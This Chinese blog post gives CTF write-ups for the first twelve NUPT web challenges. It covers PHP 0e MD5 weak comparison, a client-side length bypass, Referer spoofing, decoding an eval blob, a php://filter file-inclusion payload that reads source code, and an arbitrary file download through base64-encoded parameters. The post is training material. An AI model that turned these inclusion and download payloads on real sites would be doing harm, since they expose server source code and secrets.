<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="南邮web"><meta name="keywords" content="CTF"><meta name="author" content="bb,shuiyue75381@gmail.com"><meta name="copyright" content="bb"><title>南邮web【bb的博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!--link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!--link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!--script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"X7RY6NGU4G","apiKey":"bf7ed65264918bbc03f12b4cc1212d85","indexName":"myblog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-签到题（50）"><span class="toc-number">1.</span> <span class="toc-text">1.签到题（50）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-md5-collision（50）"><span class="toc-number">2.</span> <span class="toc-text">2.md5 collision（50）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-签到2（50）"><span class="toc-number">3.</span> <span class="toc-text">3.签到2（50）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-这题不是WEB（100）"><span class="toc-number">4.</span> <span class="toc-text">4.这题不是WEB（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-层层递进（100）"><span class="toc-number">5.</span> <span class="toc-text">5.层层递进（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-AAencode（100）"><span class="toc-number">6.</span> <span class="toc-text">6.AAencode（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-单身二十年（100）"><span class="toc-number">7.</span> <span class="toc-text">7.单身二十年（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-你从哪里来（100）"><span class="toc-number">8.</span> <span class="toc-text">8.你从哪里来（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-php-decode（100）"><span class="toc-number">9.</span> <span class="toc-text">9.php decode（100）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-文件包含（150）"><span class="toc-number">10.</span> <span class="toc-text">10.文件包含（150）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-单身一百年也没用（150）"><span class="toc-number">11.</span> <span class="toc-text">11 .单身一百年也没用（150）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-Download-（200）"><span class="toc-number">12.</span> <span class="toc-text">12 .Download~!（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-COOKIE（200）"><span class="toc-number">13.</span> <span class="toc-text">13 .COOKIE（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-MYSQL（200）"><span class="toc-number">14.</span> <span class="toc-text">14.MYSQL（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-sql-injection-3（200）"><span class="toc-number">15.</span> <span class="toc-text">15.sql injection 3（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-x00（200）"><span class="toc-number">16.</span> <span class="toc-text">16./x00（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-bypass-again（200）"><span class="toc-number">17.</span> <span class="toc-text">17.bypass again（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-变量覆盖（200）"><span class="toc-number">18.</span> <span class="toc-text">18.变量覆盖（200）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-PHP是世界上最好的语言（250）"><span class="toc-number">19.</span> <span class="toc-text">19.PHP是世界上最好的语言（250）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-伪装者（250）"><span class="toc-number">20.</span> <span class="toc-text">20.伪装者（250）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-Header（250）"><span class="toc-number">21.</span> <span class="toc-text">21.Header（250）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-上传绕过（250）"><span class="toc-number">22.</span> <span class="toc-text">22.上传绕过（250）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-SQL注入1（300）"><span class="toc-number">23.</span> <span class="toc-text">23.SQL注入1（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-pass-check（300）"><span class="toc-number">24.</span> <span class="toc-text">24.pass check（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-起名字真难（300）"><span class="toc-number">25.</span> <span class="toc-text">25.起名字真难（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-密码重置（300）"><span class="toc-number">26.</span> <span class="toc-text">26.密码重置（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-php-反序列化（300）"><span class="toc-number">27.</span> <span class="toc-text">27.php 反序列化（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-sql-injection-4（300）"><span class="toc-number">28.</span> <span class="toc-text">28.sql injection 4（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-综合题（300）"><span class="toc-number">29.</span> <span class="toc-text">29.综合题（300）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-SQL注入2（400）"><span class="toc-number">30.</span> <span class="toc-text">30.SQL注入2（400）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-综合题2（400）"><span class="toc-number">31.</span> <span class="toc-text">31.综合题2（400）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-注入实战1（500）"><span class="toc-number">32.</span> <span class="toc-text">32.注入实战1（500）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-密码重置2（500）"><span class="toc-number">33.</span> <span class="toc-text">33.密码重置2（500）</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">bb</div><div class="author-info-description">This is myblog!</div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/bbkali" target="_blank">GitHub<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="mailto:shuiyue75381@gmail.com" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1019593584&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color6"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">59</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">67</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">28</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">bb的博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">南邮web</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2019-03-12 | 更新于 2020-01-02</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" style="margin: 0 8px;"></i><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/CTF/writeup/">writeup</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/CTF/">CTF</a></div></div></div><div class="main-content"><h2 id="1-签到题（50）"><a href="#1-签到题（50）" class="headerlink" title="1.签到题（50）"></a><strong>1.签到题（50）</strong></h2><p>直接查看网页源码</p>
<p>Flag:nctf{flag_admiaanaaaaaaaaaaa}</p>
<hr>
<h2 id="2-md5-collision（50）"><a href="#2-md5-collision（50）" class="headerlink" title="2.md5 collision（50）"></a><strong>2.md5 collision（50）</strong></h2><p>源码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>重点在这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>$a不等于<span class="string">'QNKCDZO'</span> 但$a的MD5等于<span class="string">'QNKCDZO'</span>的MD5</span><br><span class="line">这想想也是不可能的事，此中必有蹊跷</span><br><span class="line"><span class="number">2.</span>观察发现md5(<span class="string">'QNKCDZO'</span>)=<span class="string">'0e830400451993494058024219903391'</span></span><br><span class="line"><span class="number">3.</span>在php中==号为弱比较<span class="string">'0e'</span>开头剩下的全为数字不管数字是多少==恒成立</span><br><span class="line">因为<span class="string">'0e***'</span>==<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>所以下一步的目的很明显制造开头为 ‘0e’ 的MD5字符串<br><a href="http://www.219.me/posts/2884.html" target="_blank" rel="noopener">字符串生成</a><br>这里将$a=s878926199a<br>得到flag:nctf{md5_collision_is_easy}</p>
<hr>
<h2 id="3-签到2（50）"><a href="#3-签到2（50）" class="headerlink" title="3.签到2（50）"></a><strong>3.签到2（50）</strong></h2><p>网页源码如下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line">尚未登录或口令错误<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    请输入口令：zhimakaimen</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"开门"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>重点在这</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    请输入口令：zhimakaimen</span><br><span class="line"></span><br><span class="line">输入的口令长度为11，而他html源码限制的长度为10</span><br></pre></td></tr></table></figure>
<p>处理方法有两种：</p>
<ol>
<li><p>利用浏览器自带插件，我这里用的是Firefox的<strong>hackbar</strong>插件，直接越过HTML代码直接进行post传递</p>
</li>
<li><p>利用burpsuit工具直接在http头上稍作修改，只需将text1赋值为zhimakaimen即可</p>
<p>上述两种方法都能直接得到flag<br>flag:nctf{follow_me_to_exploit}</p>
</li>
</ol>
<hr>
<h2 id="4-这题不是WEB（100）"><a href="#4-这题不是WEB（100）" class="headerlink" title="4.这题不是WEB（100）"></a><strong>4.这题不是WEB（100）</strong></h2><p>打开之后有个猫的图片<br>将猫图片下载至桌面<br>用txt打开此文档<br>发现如下：</p>
<p>最后为flag：nctf{photo_can_also_hid3_msg}</p>
<hr>
<h2 id="5-层层递进（100）"><a href="#5-层层递进（100）" class="headerlink" title="5.层层递进（100）"></a><strong>5.层层递进（100）</strong></h2><p>最讨厌脑洞题，拿着题不知道如何下手最后看了writeup才知道访问的URL:<a href="http://chinalover.sinaapp.com/web3/404.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/404.html</a><br>进去之后查看源码发现了如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">&lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码一眼就看出flag的举手 handsup<br>flag:nctf{this_is_a_fl4g}</p>
<hr>
<h2 id="6-AAencode（100）"><a href="#6-AAencode（100）" class="headerlink" title="6.AAencode（100）"></a><strong>6.AAencode（100）</strong></h2><p><em>tips:javascript aaencode</em><br><strong>aaencode</strong>是js加密的一种特别好玩，可以吧文字加密成表情<br>除了<strong>aaencode</strong>之外还有几种特别的加密方式</p>
<ul>
<li>Perl的ppencode</li>
<li>Ruby的rrencode</li>
</ul>
<p>编码连接如下：<a href="http://www.cnblogs.com/android-html5/archive/2011/02/09/2533784.html" target="_blank" rel="noopener">http://www.cnblogs.com/android-html5/archive/2011/02/09/2533784.html</a></p>
<p>AAencode 可以直接在<strong><em>chrome浏览器</em></strong> 的控制台console直接运行：<br>运行方式如图：</p>
<p>这里有console的好玩用法：<a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="noopener">http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html</a><br>总之console在这了可以执行js AAencode加密过的代码：<br>得到flag：nctf{javascript_aaencode}</p>
<hr>
<h2 id="7-单身二十年（100）"><a href="#7-单身二十年（100）" class="headerlink" title="7.单身二十年（100）"></a><strong>7.单身二十年（100）</strong></h2><p>题目上说看手速，其实一开始用浏览器查看网络流发现如下:</p>
<p>看见了没！！！有个源文件 search_key.php！！！<br>接下来就是截获这个源文件了。。。。。<br>直接上burpsuit截获。上图</p>
<p>key is : nctf{yougotit_script_now}</p>
<hr>
<h2 id="8-你从哪里来（100）"><a href="#8-你从哪里来（100）" class="headerlink" title="8.你从哪里来（100）"></a><strong>8.你从哪里来（100）</strong></h2><p>are you from google?</p>
<p>一看就知道我要伪造从<a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a> 那里来<br><a href="http://blog.csdn.net/linhaiman/article/details/7025336" target="_blank" rel="noopener">这里有篇博客</a>写的就是http header的字段<br>这里面有个referer字段：HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。<br>我们另Referer:<a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a><br>再burpsuit直接改就行<br>如下图：</p>
<p>拿到flag：nctf{http_referer}</p>
<hr>
<h2 id="9-php-decode（100）"><a href="#9-php-decode（100）" class="headerlink" title="9.php decode（100）"></a><strong>9.php decode（100）</strong></h2><p>直接让解码，看看代码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>eval 是个神奇的函数<a href="http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/17/1829166.html" target="_blank" rel="noopener">关于eval的链接在这</a><br>eval可以执行php代码所以我直接让他执行并输出修改代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>);</span><br></pre></td></tr></table></figure>
<p>放在php里直接运行，得出结果<br>flag:nctf{gzip_base64_hhhhhh}</p>
<hr>
<h2 id="10-文件包含（150）"><a href="#10-文件包含（150）" class="headerlink" title="10.文件包含（150）"></a><strong>10.文件包含（150）</strong></h2><p>这道题非常棒!!!让我学到了一个新的漏洞<br><strong>文件包含漏洞</strong>，<a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">先了解一下php://filter</a><br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>同时我也借此机会学到了文件读取的相关知识。</p>
<ul>
<li>include “test.php”php文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用<strong>php://filter</strong>进行过滤，返回值为0,1。</li>
<li>readfile(“test.php”)是将文件以数据流的形式读取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。</li>
<li><p>file_get_contents(“test.php”)返回值为文本内容</p>
<p>此题运用的就是关于数据流过滤的文件包含，我们一般在进行文件包含的时候都这么写include “test.php”获得的就是test.php直接解析出来。但如果运用readfile(“test.php”) 就不进行解析，导致无法在浏览器前台进行显示。<strong>那么问题来了看题</strong></p>
</li>
</ul>
<p>它让我点击它 我一下子就点了他！！！<br>出来了个这个URL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4.chinalover.sinaapp.com/web7/index.php?file=show.php</span><br></pre></td></tr></table></figure>
<p>一看呵呵哒，典型的文件包含漏洞我们可以通过构造含有漏洞的语句，查看想要看的代码<br>file=php://filter/read=convert.base64-encode/resource=index.php<br><a href="http://www.cnseay.com/2356/comment-page-1/" target="_blank" rel="noopener">这里有个关于漏洞的详解</a><br>简单的重复一下他的意思<br>注解：<br>1.php://filter/可用于处理打开的数据流，起到过滤作用。如果源文件为.php则很有可能在前台显示不出来。<br>2.此时我们采用的方法是，先让文件转化为base64格式（convert.base64-encode）然后再输出，这样不论是什么格式的文件都可以在前台输出。<br>3.再次解码就可得到源代码，怎么样是不是很神奇啊！<br>看图片：</p>
<p>看见了base64编码！！<br>python解码就行啦，看图</p>
<p>flag:nctf{edulcni_elif_lacol_si_siht}</p>
<hr>
<h2 id="11-单身一百年也没用（150）"><a href="#11-单身一百年也没用（150）" class="headerlink" title="11 .单身一百年也没用（150）"></a><strong>11 .单身一百年也没用（150）</strong></h2><p>上去直接查看请求头：</p>
<p>flag就在眼前nctf{this_is_302_redirect}<br>最简单的一道题</p>
<hr>
<h2 id="12-Download-（200）"><a href="#12-Download-（200）" class="headerlink" title="12 .Download~!（200）"></a><strong>12 .Download~!（200）</strong></h2><p>查看页面源码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM="</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>星星点灯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"download.php?url=YnV4aWFuZ3poYW5nZGEubXAz"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>不想长大<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">发现了下载文件的URL</span><br><span class="line">download.php?url=base64('文件名')</span><br><span class="line">这里我没想到下载download.php。不过想想也是，这也没有其他文件了吧除了这个。果断转码base64('download.php')=ZG93bmxvYWQucGhw</span><br><span class="line"></span><br><span class="line">URL=https://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw</span><br></pre></td></tr></table></figure>
<p>下载得到download.php代码，如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"hereiskey.php"</span>);</span><br><span class="line">$url=base64_decode($_GET[url]);</span><br><span class="line"><span class="keyword">if</span>( $url==<span class="string">"hereiskey.php"</span> || $url==<span class="string">"buxiangzhangda.mp3"</span> || $url==<span class="string">"xingxingdiandeng.mp3"</span> || $url==<span class="string">"download.php"</span>)&#123;</span><br><span class="line">    $file_size = filesize($url);</span><br><span class="line">    header ( <span class="string">"Pragma: public"</span> );</span><br><span class="line">    header ( <span class="string">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span> );</span><br><span class="line">    header ( <span class="string">"Cache-Control: private"</span>, <span class="keyword">false</span> );</span><br><span class="line">    header ( <span class="string">"Content-Transfer-Encoding: binary"</span> );</span><br><span class="line">    header ( <span class="string">"Content-Type:audio/mpeg MP3"</span>);</span><br><span class="line">    header ( <span class="string">"Content-Length: "</span> . $file_size);</span><br><span class="line">    header ( <span class="string">"Content-Disposition: attachment; filename="</span>.$url);</span><br><span class="line">    <span class="keyword">echo</span>(file_get_contents($url));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Access Forbidden!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>又发现了一个文件hereiskey.php，估计flag就在里面，果断下载<br>URL：way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA==<br>得到flag代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag:nctf&#123;download_any_file_666&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>flag:nctf{download_any_file_666}</p>
<hr>
